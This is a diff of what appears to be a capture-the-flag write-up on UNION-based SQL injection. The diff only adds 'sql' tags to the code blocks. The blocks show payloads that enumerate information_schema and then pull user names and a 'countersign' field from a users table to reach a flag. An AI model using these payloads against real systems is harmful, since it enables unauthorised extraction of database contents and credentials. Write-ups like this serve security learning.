@@ -20,7 +20,7 @@ Now let's get some more informations about the database.
 
 We can try to add another SQL request with `UNION` and get more infos with the request:
 
-```
+```sql
  1 UNION SELECT * FROM information_schema.columns
 ```
 
@@ -34,7 +34,7 @@ It seems like we need to select only 2 informations because our first SQL reques
 
 So let's get all the columns and tables avalaible on the dabase with:
 
-```
+```sql
  1 UNION SELECT column_name, table_name FROM information_schema.columns
 ```
 
@@ -43,7 +43,7 @@ It worked ! By looking closely we see a `users` table that has 8 columns:
 
 Let's check each users with:
 
-```
+```sql
 1 UNION SELECT last_name, first_name FROM users
 ```
 
@@ -51,7 +51,7 @@ One of the users returns us `GetThe` as 'last_name' and `Flag` as 'first_name' !
 
 By checking the other infos about this user, we finally try:
 
-```
+```sql
 1 UNION SELECT Commentaire, countersign FROM users
 ```
 
